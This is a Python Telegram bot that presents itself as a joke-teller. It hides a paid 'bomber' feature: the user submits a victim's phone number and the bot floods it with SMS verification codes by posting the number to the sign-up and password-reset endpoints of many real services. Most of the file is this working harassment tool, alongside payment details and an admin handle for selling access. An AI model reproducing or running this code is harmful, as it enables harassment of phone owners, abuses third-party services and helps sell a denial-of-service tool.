# -*- coding: utf-8 -*-
import sqlite3

import requests
from config import TOKEN
import telebot
from telebot import types
import random2 as random
import requests


bot = telebot.TeleBot(token=TOKEN)

con = sqlite3.connect('a.db',check_same_thread=False)
cursor = con.cursor()

admin = []


@bot.message_handler(commands=['start'])
def welcome(message):
    markup = types.InlineKeyboardMarkup(row_width=3)
    item1 = types.InlineKeyboardButton('Да', callback_data='joke')
    item2 = types.InlineKeyboardButton('Конечно', callback_data='joke')
    markup.add(item1,item2)
    bot.send_message(message.chat.id, "Хочешь расскажу тебе шутку?", reply_markup=markup)

def joke(message):
    cursor.execute(f'SELECT * FROM a WHERE id = {random.randint(1,32640)}')
    record = cursor.fetchall()
    markup = types.ReplyKeyboardMarkup(resize_keyboard = True)
    item1 = types.KeyboardButton('Бомбер')
    item2 = types.KeyboardButton('Давай еще одну')
    item3 = types.KeyboardButton("Тех. поддержка")
    markup.add(item1,item2,item3)

    bot.send_message(message.chat.id, text=[i[1] for i in record], reply_markup=markup)

def phone(message):
    msg = bot.send_message(message.chat.id, "Напиши номер телефона (79*********: ")
    bot.register_next_step_handler(msg, bomber)

def bomber(message):
    phone = message.text

    for x in range(12):
        name = random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
        password = random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))
        username = random.choice(list('123456789qwertyuiopasdfghjklzxcvbnmQWERTYUIOPASDFGHJKLZXCVBNM'))

    phone9 = phone[1:]
    phoneAresBank = '+'+phone[0]+'('+phone[1:4]+')'+phone[4:7]+'-'+phone[7:9]+'-'+phone[9:11]
    phone9dostavista = phone9[:3]+'+'+phone9[3:6]+'-'+phone9[6:8]+'-'+phone9[8:10]
    phoneOstin = '+'+phone[0]+'+('+phone[1:4]+')'+phone[4:7]+'-'+phone[7:9]+'-'+phone[9:11]
    phonePizzahut = '+'+phone[0]+' ('+phone[1:4]+') '+phone[4:7]+' '+phone[7:9]+' '+phone[9:11]
    phoneGorzdrav = phone[1:4]+') '+phone[4:7]+'-'+phone[7:9]+'-'+phone[9:11]

    _email = name+f'{random.randint(0,1000)}'+'@gmail.com'

    bot.send_message(message.chat.id, "Выполняю...")

    try:
        requests.post('https://p.grabtaxi.com/api/passenger/v2/profiles/register', data={'phoneNumber': phone,'countryCode': 'ID','name': 'test','email': 'mail@mail.com','deviceToken': '*'}, headers={'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36'})
    except:
        pass
    try:
        requests.post('https://moscow.rutaxi.ru/ajax_keycode.html', data={'l': phone9}).json()["res"]

    except:
        pass
    try:
        requests.post('https://belkacar.ru/get-confirmation-code', data={'phone': phone}, headers={})

    except:
        pass

    try:
        requests.post('https://api.gotinder.com/v2/auth/sms/send?auth_type=sms&locale=ru', data={'phone_number': phone}, headers={})
        bot.send_message(message.chat.id, "Выполнено 5%")
    except:
        bot.send_message(message.chat.id, "Выполнено 5%")

    try:
        requests.post('https://app.karusel.ru/api/v1/phone/', data={'phone': phone}, headers={})
    except:
        pass

    try:
        requests.post('https://api.tinkoff.ru/v1/sign_up', data={'phone': '+'+phone}, headers={})
    except:
        pass

    try:
        requests.post('https://api.mtstv.ru/v1/users', json={'msisdn': phone}, headers={})
    except:
        pass

    try:
        requests.post('https://youla.ru/web-api/auth/request_code', data={'phone': phone})
    except:
        pass

    try:
        requests.post('https://pizzahut.ru/account/password-reset', data={'reset_by':'phone', 'action_id':'pass-recovery', 'phone': phonePizzahut, '_token':'*'})
    except:
        pass

    try:
        requests.post('https://www.rabota.ru/remind', data={'credential': phone})

    except:
        pass

    try:
        requests.post('https://rutube.ru/api/accounts/sendpass/phone', data={'phone': '+'+phone})

    except:
        requests.post('https://www.citilink.ru/registration/confirm/phone/+'+phone+'/')

    try:
        requests.post('https://www.smsint.ru/bitrix/templates/sms_intel/include/ajaxRegistrationTrigger.php', data={'name': name,'phone': phone, 'promo': 'yellowforma'})
        bot.send_message(message.chat.id, "Выполнено 11%")
    except:
        bot.send_message(message.chat.id, "Выполнено 11%")


    bot.send_message(message.chat.id, "Выполнено!")

@bot.message_handler(content_types='text')
def answer(message):
    if message.chat.type == 'private':
        if message.text == 'Давай еще одну':
            joke(message)
        elif message.text == "Бомбер":
            if len(admin) > 0:
                if message.from_user.username in admin:
                    phone(message)
                else:
                    bot.send_message(message.chat.id, "Пришлите 15р по таким на реквизиты 89283248788\nВ сообщение укажите имя пользователя (@***)")
            else:
                bot.send_message(message.chat.id, "Пришлите 15р по таким на реквизиты 89283248788\nВ сообщение укажите имя пользователя (@***)")
        elif message.text.split()[0] == "!add" and message.from_user.username == "nechyrkaser": #Имя пользователя для админки
            admin.append(message.text.split()[1])
        elif message.text.split()[0] == "!remove":
            if message.text.split()[1] in admin and  message.from_user.username == "nechyrkaser": #Имя пользователя для админки
                admin.remove(message.text.split()[1])
            else:
                bot.send_message(message.chat.id, "Такого пользователя итак нет!")
        elif message.text == "Тех. поддержка":
            bot.send_message(message.chat.id, "Если у вас возникли вопросы по боту, то напишите сюда\n->  @nechyrkaser")
@bot.callback_query_handler(func = lambda call: True)
def callback(call):
    if call.message:
        if call.data == 'joke':
            joke(call.message)
bot.infinity_polling(timeout=10, long_polling_timeout=5)